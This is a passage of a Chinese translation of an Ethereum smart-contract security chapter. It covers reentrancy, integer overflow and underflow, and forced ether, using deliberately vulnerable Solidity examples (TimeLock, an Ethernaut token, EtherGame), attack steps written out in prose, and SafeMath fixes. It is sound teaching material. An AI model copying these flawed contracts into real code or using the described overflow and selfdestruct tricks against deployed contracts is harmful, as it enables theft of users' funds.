<span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">depositFunds</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> withdrawFunds <span class="token punctuation">(</span><span class="token builtin">uint256</span> _weiToWithdraw<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token operator">!</span>reEntrancyMutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _weiToWithdraw<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// limit the withdrawal</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>_weiToWithdraw <span class="token operator">&lt;=</span> withdrawalLimit<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// limit the time allowed to withdraw</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>now <span class="token operator">>=</span> lastWithdrawTime<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> weeks<span class="token punctuation">)</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _weiToWithdraw<span class="token punctuation">;</span>        lastWithdrawTime<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> now<span class="token punctuation">;</span>        <span class="token comment">// set the reEntrancy mutex before the external call</span>        reEntrancyMutex <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>_weiToWithdraw<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// release the mutex after the external call</span>        reEntrancyMutex <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="现实世界的例子：The-DAO"><a href="#现实世界的例子：The-DAO" class="headerlink" title="现实世界的例子：The DAO"></a>现实世界的例子：The DAO</h3><p>The DAO（去中心化自治组织）攻击是以太坊早期开发中发生的主要黑客攻击之一。当时，合约金额超过 1.5 亿美元。重入在攻击中发挥了重要作用，最终导致了创建以太坊经典（ETC）的硬分叉。有关 DAO 漏洞利用的良好分析，请参阅 <a href="http://bit.ly/2EQaLCI">Analysis of the DAO exploit (hackingdistributed.com)</a>。有关以太坊分叉历史、DAO 黑客时间表以及硬分叉中 ETC 诞生的更多信息，请参见 <a href="https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#ethereum_standards">ethereum_standards</a>。</p><h2 id="算术上溢-x2F-下溢-Arithmetic-Over-x2F-Underflows"><a href="#算术上溢-x2F-下溢-Arithmetic-Over-x2F-Underflows" class="headerlink" title="算术上溢&#x2F;下溢 (Arithmetic Over&#x2F;Underflows)"></a>算术上溢&#x2F;下溢 (Arithmetic Over&#x2F;Underflows)</h2><p>以太坊虚拟机为整数指定固定大小的数据类型。这意味着一个整数变量只能表示一定范围的数字。例如，一个 <code>uint8</code> 只能存储 [0,255] 范围内的数字。尝试将 <code>256</code> 存储到 <code>uint8</code> 将导致 <code>0</code>。如果不小心，如果未检查用户输入并且执行的计算导致数字超出存储它们的数据类型范围，那么 Solidity 中的变量就会被利用。</p><p>有关算术上溢&#x2F;下溢的进一步阅读，请参阅“<a href="https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17d">How to Secure Your Smart Contracts</a>”、<a href="https://consensys.github.io/smart-contract-best-practices/">Ethereum Smart Contract Best Practices</a> 和“<a href="https://randomoracle.wordpress.com/2018/04/27/ethereum-solidity-and-integer-overflows-programming-blockchains-like-1970/">Ethereum, Solidity and integer overflows: programming blockchains like 1970</a>”。</p><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>当执行需要固定大小的变量来存储超出变量数据类型范围的数字（或数据段）的操作时，会发生上溢&#x2F;下溢。</p><p>例如，从值为 <code>0</code> 的 <code>uint8</code>（8 位无符号整数；即非负数）变量中减去 <code>1</code> 将得到数字 <code>255</code>。这是下溢(<em>underflow</em>)。我们已经分配了一个低于 <code>uint8</code> 范围的数字，因此结果会环绕(<em>wraps around</em>)并给出 <code>uint8</code> 可以存储的最大数字。同样，将 <code>2^8=256</code> 加到一个 <code>uint8</code> 变量将使变量保持不变，因为我们已经环绕了 <code>uint</code> 的整个长度。这种行为的两个简单类比是汽车中的里程表，它测量行驶距离（在超过最大数字，即 999999 之后，它们重置为 000000）和周期性数学函数（在 sin 的参数中添加 2π 保持值不变） .</p><p>加上大于数据类型范围的数字称为上溢(<em>overflow</em>)。为清楚起见，将 <code>257</code> 添加到当前值为 <code>0</code> 的 <code>uint8</code> 将导致数字 <code>1</code>。有时将固定大小的变量视为循环变量是有启发性的，如果我们将数字添加到最大值之上，我们将从零重新开始可能存储的数字，如果我们从零减去，则从最大数字开始倒数。在有符号的 <code>int</code> 类型可以表示负数的情况下，一旦达到最大的负值，我们就会重新开始；例如，如果我们尝试从值为 <code>-128</code> 的 <code>int8</code> 中减去 <code>1</code>，我们将得到 <code>127</code>。</p><p>这些类型的数字陷阱允许攻击者滥用代码并创建意外的逻辑流。例如，考虑 TimeLock.sol 中的 TimeLock 合约。</p><p>示例3. TimeLock.sol</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">TimeLock</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> lockTime<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>        lockTime<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> now <span class="token operator">+</span> <span class="token number">1</span> weeks<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">increaseLockTime</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _secondsToIncrease<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        lockTime<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> _secondsToIncrease<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>now <span class="token operator">></span> lockTime<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> transferValue <span class="token operator">=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>transferValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这份合约的设计就像一个时间保险库：用户可以将以太币存入合约，并将被锁定至少一周。如果他们愿意，用户可以将等待时间延长到 1 周以上，但一旦存入，用户可以确保他们的以太币被安全锁定至少一周。</p><p>如果用户被迫交出他们的私钥，这样的合约可能会很方便地确保他们的以太币在短时间内无法获得。但是，如果用户在该合约中锁定了 <code>100 ether</code> 并将其密钥交给攻击者，则攻击者可以使用溢出来接收以太币，而不管锁定时间如何。</p><p>攻击者可以确定他们现在持有密钥的地址的当前 <code>lockTime</code>（它是一个公共变量）。我们称之为 <code>userLockTime</code>。然后他们可以调用 <code>increaseLockTime</code> 函数并将数字 <code>2^256 - userLockTime</code> 作为参数传递。这个数字将被添加到当前 <code>userLockTime</code> 并导致溢出，将 <code>lockTime[msg.sender]</code> 重置为 <code>0</code>。然后攻击者可以简单地调用 <code>withdraw</code> 函数来获得他们的奖励。</p><p>让我们看另一个示例(<a href="https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#underflow_vulnerability_example_from_ethernaut_challenge">Underflow vulnerability example from Ethernaut challenge</a>)，这来自 <a href="https://github.com/OpenZeppelin/ethernaut">Ethernaut challenges</a>。</p><p>剧透警告：如果您还没有完成 Ethernaut challenges，这将提供其中一个级别的解决方案。</p><p>示例4. Underflow vulnerability example from Ethernaut challenge</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Token</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> balances<span class="token punctuation">;</span>  <span class="token builtin">uint</span> <span class="token keyword">public</span> totalSupply<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">Token</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _initialSupply<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> totalSupply <span class="token operator">=</span> _initialSupply<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint</span> _value<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> _value <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _value<span class="token punctuation">;</span>    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">+=</span> _value<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">constant</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> balance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> balances<span class="token punctuation">[</span>_owner<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这是一个使用转移功能的简单代币合约，允许参与者移动他们的代币。你能看出这份合约的错误吗？</p><p>缺陷出现在 <code>transfer</code> 函数中。可以使用下溢绕过第 13 行的 require 语句。考虑一个余额为零的用户。他们可以使用任何非零 <code>_value</code> 调用 <code>transfer</code> 函数并在第 13 行传递 require 语句。这是因为 <code>balances[msg.sender]</code> 为 0（和 <code>uint256</code>），因此减去任何正数（不包括 <code>2^256</code>）将导致一个正数，如前所述。第 14 行也是如此，其中余额将记为正数。因此，在此示例中，攻击者可以通过下溢漏洞获得免费代币。</p><h3 id="预防技术-1"><a href="#预防技术-1" class="headerlink" title="预防技术"></a>预防技术</h3><p><strong>当前防止下溢&#x2F;下溢漏洞的常规技术是使用或构建数学库来替换标准数学运算符加法、减法和乘法（除法被排除在外，因为它不会导致上溢&#x2F;下溢，并且 EVM 在除以 0 时 revert）。</strong></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts">OpenZeppelin</a> 在为以太坊社区构建和审核安全库方面做得非常出色。特别是，它的 <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v1.12.0/contracts/math/SafeMath.sol">SafeMath</a> 库可用于避免下溢&#x2F;上溢漏洞。</p><p>为了演示如何在 Solidity 中使用这些库，让我们使用 SafeMath 库更正 TimeLock 合约。合约的无溢出版本是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">library</span> <span class="token class-name">SafeMath</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">function</span> <span class="token function">mul</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token builtin">uint256</span> c <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span>    <span class="token keyword">assert</span><span class="token punctuation">(</span>c <span class="token operator">/</span> a <span class="token operator">==</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> c<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">div</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// assert(b > 0); // Solidity automatically throws when dividing by 0</span>    <span class="token builtin">uint256</span> c <span class="token operator">=</span> a <span class="token operator">/</span> b<span class="token punctuation">;</span>    <span class="token comment">// assert(a == b * c + a % b); // This holds in all cases</span>    <span class="token keyword">return</span> c<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">sub</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">assert</span><span class="token punctuation">(</span>b <span class="token operator">&lt;=</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> a <span class="token operator">-</span> b<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">)</span> <span class="token keyword">internal</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span> c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span>    <span class="token keyword">assert</span><span class="token punctuation">(</span>c <span class="token operator">>=</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> c<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">TimeLock</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint</span><span class="token punctuation">;</span> <span class="token comment">// use the library for uint type</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> lockTime<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        lockTime<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> now<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span> weeks<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">increaseLockTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _secondsToIncrease<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        lockTime<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> lockTime<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>_secondsToIncrease<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>now <span class="token operator">></span> lockTime<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> transferValue <span class="token operator">=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>transferValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>请注意，所有标准数学运算都已替换为 <code>SafeMath</code> 库中定义的运算。 <code>TimeLock</code> 合约不再执行任何能够下溢&#x2F;溢出的操作。</p><h3 id="现实世界的例子：PoWHC-和批量传输溢出-CVE-2018-10299"><a href="#现实世界的例子：PoWHC-和批量传输溢出-CVE-2018-10299" class="headerlink" title="现实世界的例子：PoWHC 和批量传输溢出(CVE-2018-10299)"></a>现实世界的例子：PoWHC 和批量传输溢出(CVE-2018-10299)</h3><p>弱手币证明 (Proof of Weak Hands Coin, PoWHC) 最初是为了某种玩笑而设计的，是一个由互联网集体编写的庞氏骗局。不幸的是，合约的作者似乎之前没有看到过溢出&#x2F;下溢，因此 866 以太币从其合约中解放出来。 Eric Banisadr 在他关于该事件的博客文章(<a href="https://medium.com/@ebanisadr/how-800k-evaporated-from-the-powh-coin-ponzi-scheme-overnight-1b025c33b530">How $800k Evaporated from the PoWH Coin Ponzi Scheme Overnight</a>)中很好地概述了下溢是如何发生的（这与前面描述的 Ethernaut challenge 并没有太大的不同）。</p><p>另一个例子(<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">EIPs&#x2F;eip-20</a>)来自在一组 ERC20 代币合约中实现 <code>batchTransfer()</code> 函数。该实现包含溢出漏洞；您可以阅读 <a href="https://peckshield.medium.com/alert-new-batchoverflow-bug-in-multiple-erc20-smart-contracts-cve-2018-10299-511067db6536">PeckShield’s account</a> 中的详细信息。</p><h2 id="意外的以太币-Unexpected-Ether"><a href="#意外的以太币-Unexpected-Ether" class="headerlink" title="意外的以太币 (Unexpected Ether)"></a>意外的以太币 (Unexpected Ether)</h2><p>通常，当以太币被发送到合约时，它必须执行 fallback 函数或合约中定义的另一个函数。有两个例外，以太可以存在于合约中而无需执行任何代码。对于发送给他们的所有以太币，依赖于代码执行的合约可能容易受到强制发送以太币的攻击。</p><p>有关这方面的进一步阅读，请参阅“<a href="https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-2-730db0aa4834">How to Secure Your Smart Contracts</a>”。</p><h3 id="漏洞-2"><a href="#漏洞-2" class="headerlink" title="漏洞"></a>漏洞</h3><p><strong>用于强制执行正确的状态转换或验证操作的常见防御性编程技术是不变检查(invariant checking)。</strong>该技术涉及定义一组不变量(<em>invariants</em>)（不应改变的度量或参数）并检查它们在单个（或多个）操作后是否保持不变。如果被检查的不变量是实际上的不变量，这通常是一个好的设计。不变量的一个例子是固定发行的 <a href="http://bit.ly/2CUf7WG">ERC20 token</a> 的 <code>totalSupply</code>。由于任何函数都不应修改此不变量，因此可以向 <code>transfer</code> 函数添加一个检查，以确保 <code>totalSupply</code> 保持不变，保证函数按预期工作。</p><p>特别是，有一个明显的不变量，它可能很容易使用，但实际上可以被外部用户操纵（不管智能合约中的规则如何）。这是存储在合约中的当前以太币。通常，当开发人员第一次学习 Solidity 时，他们会误认为合约只能通过支付功能接受或获得以太币。这种误解可能导致合约对其中的以太币余额做出错误假设，从而导致一系列漏洞。这个漏洞的确凿证据是 <code>this.balance</code> 的（不正确的）使用。</p><p>有两种方法可以（强制）将以太币发送到合约，而无需使用可支付函数或在合约上执行任何代码：</p><p><em>自毁(Self-destruct)</em></p><p>任何合约都可以实现 <a href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#self-destruct">selfdestruct 函数</a>，该功能从合约地址中删除所有字节码，并将存储在那里的所有以太币发送到参数指定的地址。<strong>如果这个指定的地址也是一个合约，则不会调用任何函数（包括 fallback）。</strong>因此，<code>selfdestruct</code> 函数<strong>可用于强制向任何合约发送以太币，而不管合约中可能存在的任何代码，甚至是没有支付功能的合约</strong>。这意味着任何攻击者都可以创建带有 <code>selfdestruct</code> 函数的合约，向其发送以太币，调用 <code>selfdestruct(target)</code> 并强制将以太币发送到目标合约。 Martin Swende 有一篇出色的博客文章(<a href="https://swende.se/blog/Ethereum_quirks_and_vulns.html">Ethereum quirks and vulns</a>)，描述了 self-destruct 操作码的一些怪癖（Quirk #2），以及客户端节点如何检查不正确的不变量，这可能导致以太坊网络发生灾难性的崩溃。</p><p><em>赠送以太币(Pre-sent ether)</em></p><p><strong>将以太币加入合约的另一种方法是用以太币预加载合约地址。</strong>合约地址是确定性的——事实上，地址是根据创建合约的地址和创建合约的交易随机数的 Keccak-256（通常与 SHA-3 同义）哈希计算的。具体来说，它的格式为 <code>address = sha3(rlp.encode([account_address,transaction_nonce]))</code>（有关一些有趣的用例，请参见 Adrian Manning 关于“<a href="https://blog.sigmaprime.io/solidity-security.html#keyless-eth">无密钥以太(Keyless Ether)</a>”的讨论）。这意味着任何人都可以在创建合约之前计算出合约的地址，并将以太币发送到该地址。创建合约时，它将有一个非零的以太币余额。</p><p>让我们探讨一下这些知识可能出现的一些陷阱。考虑一下 EtherGame.sol 中过于简单的合约。</p><p>示例5. EtherGame.sol</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">EtherGame</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> payoutMileStone1 <span class="token operator">=</span> <span class="token number">3</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> mileStone1Reward <span class="token operator">=</span> <span class="token number">2</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> payoutMileStone2 <span class="token operator">=</span> <span class="token number">5</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> mileStone2Reward <span class="token operator">=</span> <span class="token number">3</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> finalMileStone <span class="token operator">=</span> <span class="token number">10</span> ether<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> finalReward <span class="token operator">=</span> <span class="token number">5</span> ether<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> redeemableEther<span class="token punctuation">;</span>    <span class="token comment">// Users pay 0.5 ether. At specific milestones, credit their accounts.</span>    <span class="token keyword">function</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">==</span> <span class="token number">0.5</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// each play is 0.5 ether</span>        <span class="token builtin">uint</span> currentBalance <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>balance <span class="token operator">+</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token comment">// ensure no players after the game has finished</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>currentBalance <span class="token operator">&lt;=</span> finalMileStone<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// if at a milestone, credit the player's account</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>currentBalance <span class="token operator">==</span> payoutMileStone1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            redeemableEther<span class="token punctuation">[</span>msg<span class="token 